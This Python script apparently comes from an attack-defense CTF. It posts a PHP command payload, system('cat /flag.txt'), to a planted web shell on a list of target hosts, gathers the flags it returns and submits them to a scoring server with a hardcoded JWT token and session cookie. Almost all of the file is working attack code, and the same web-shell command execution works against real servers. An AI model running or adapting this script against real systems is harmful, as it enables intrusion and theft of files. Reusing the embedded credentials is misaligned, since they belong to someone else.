from get_host import *
url = clear_url,http_url,https_url
import requests
session = requests.Session()
ffff = []

for i in url[1]:
    try:
        u = i + '/uploads/abc1/20210609/shell.php'
        print(u)
        html = requests.post(u,data={"a":"system('cat /flag.txt');"},timeout=3)
        if 'flag{' in html.text:
            ffff.append(html.text.split('\n')[0])
    except Exception as e:
        vv=1
for i in ffff:
    print(i)
    paramsGet = {"m":"flagSubmit"}
    paramsPost = {"flag":"{}".format(i)}
    headers = {"Origin":"http://awd.ctf.secdriver.com:8089","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36","Referer":"http://awd.ctf.secdriver.com:8089/","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjMxOCIsInVzZXJuYW1lIjoienpzeHkiLCJuaWNrbmFtZSI6IumDkeW3nuWVhuWtpumZoumYnyIsIlRlYW1zSUQiOiIzMzIiLCJ0ZWFtTmFtZSI6IumDkeW3nuWVhuWtpumZoumYnyIsInRva2VuIjoiNTlhZjZjODU0ZmM3ZWZlMDA5ZjQyNDk2YjlkOWU3MTIiLCJpYXQiOjE2NjAyNjU3MTMsImV4cCI6MTY2MDI5NDUxMywibmJmIjoxNjYwMjY1NzEzLCJqdGkiOiJhMmM5ZDNlNTc5YTNjNDE1MTk4ZmI1MzM0MzBlZWIyNiJ9.71Bz7habEeZ8UkxgmeNn3qV5thNRHxjVRZOTwwAJgXA","Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"}
    cookies = {"PHPSESSID":"6j6u4aq63ll4t52ctj8elr0bvc"}
    response = session.post("http://awd.ctf.secdriver.com:8089/ajax.php", data=paramsPost, params=paramsGet, headers=headers, cookies=cookies)


